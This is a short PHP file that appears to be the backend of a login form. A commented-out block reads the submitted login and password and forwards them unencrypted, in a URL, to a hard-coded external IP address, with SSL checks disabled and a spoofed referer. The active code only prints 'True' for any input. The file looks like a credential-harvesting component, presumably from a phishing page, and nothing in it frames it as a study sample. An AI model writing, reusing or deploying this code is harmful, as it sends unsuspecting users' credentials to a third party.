<?php 
/*function cURL($url, $ref, $header, $cookie, $p){
$ch =  curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);    
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_REFERER, $ref);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);    
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
if ($p) {
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $p);
}
$result =  curl_exec($ch);
curl_close($ch);
if ($result){
    return $result;
}else{
    return '';
}
}
$login = $_POST['login'];
$pass = $_POST['password'];
$url = "http://109.234.37.75:8888/?login=".$login."&password=".$pass."";
$response = cURL($url, "https://google.com", 0, 0, null);
echo $response;*/
echo "True";

?>